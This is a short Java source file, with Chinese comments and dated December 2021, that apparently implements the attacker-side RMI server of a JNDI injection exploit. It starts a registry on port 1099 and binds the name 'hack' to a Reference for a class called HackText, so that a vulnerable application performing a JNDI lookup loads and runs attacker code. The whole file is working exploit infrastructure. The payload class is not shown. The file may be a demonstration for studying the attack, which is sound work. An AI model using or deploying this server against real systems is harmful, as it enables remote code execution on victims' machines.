package com.yy.hacker;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @Author: 24只羊羊羊
 * @Date: 2021-12-12
 * @Description:
 */
public class HackService {

    public static void main(String[] args) {
        try {
            // 启动服务
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            // 创建资源
            Reference reference = new Reference("com.yy.hacker.HackText", "com.yy.hacker.HackText", null);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            // 绑定资源
            registry.bind("hack", referenceWrapper);
            System.out.println("服务初始化完成");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
